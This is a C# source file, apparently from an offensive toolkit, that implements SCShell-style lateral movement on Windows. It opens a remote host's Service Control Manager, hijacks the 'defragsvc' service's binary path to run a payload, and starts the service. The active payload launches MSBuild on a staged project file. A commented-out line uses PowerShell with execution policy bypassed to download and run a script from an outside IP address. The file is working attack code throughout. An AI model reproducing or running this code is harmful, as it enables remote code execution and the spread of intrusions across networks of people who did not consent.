using System.Runtime.InteropServices;
using System;

namespace ExtensionToolkit.Func
{
    internal class LateralMovement
    {
        [DllImport("advapi32.dll", EntryPoint = "OpenSCManagerW", ExactSpelling = true, CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr OpenSCManager(string machineName, string databaseName, uint dwAccess);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern IntPtr OpenService(IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess);

        [DllImport("advapi32.dll", EntryPoint = "ChangeServiceConfig")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ChangeServiceConfigA(IntPtr hService, uint dwServiceType, int dwStartType, int dwErrorControl, string lpBinaryPathName, string lpLoadOrderGroup, string lpdwTagId, string lpDependencies, string lpServiceStartName, string lpPassword, string lpDisplayName);

        [DllImport("advapi32", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool StartService(IntPtr hService, int dwNumServiceArgs, string[] lpServiceArgVectors);

        public static void LateralService(string target)
        {
            // scshell
            //string payload = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\powershell.exe -ExecutionPolicy Bypass -Command (New-Object Net.WebClient).DownloadString('http://192.168.45.195/1.ps1')";
            string payload = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe C:\\Users\\Public\\test.csproj";
            Console.WriteLine($"Attempting to exec {payload} on {target}");

            IntPtr SCMHandle = OpenSCManager(target, null, 0xF003F);
            string ServiceName = "defragsvc";
            IntPtr schService = OpenService(SCMHandle, ServiceName, 0xF01FF);

            // Modificar a configuração do serviço para incluir o comando completo
            bool bResult = ChangeServiceConfigA(schService, 0xffffffff, 3, 0, payload, null, null, null, null, null, null);

            if (bResult)
            {
                Console.WriteLine("Service configuration changed successfully.");

                // Tentar iniciar o serviço sem passar argumentos adicionais
                bResult = StartService(schService, 0, null);

                if (bResult)
                {
                    Console.WriteLine("Service started successfully.");
                }
                else
                {
                    Console.WriteLine("Failed to start the service.");
                }
            }
            else
            {
                Console.WriteLine("Failed to change the service configuration.");
            }


        }
    }
}
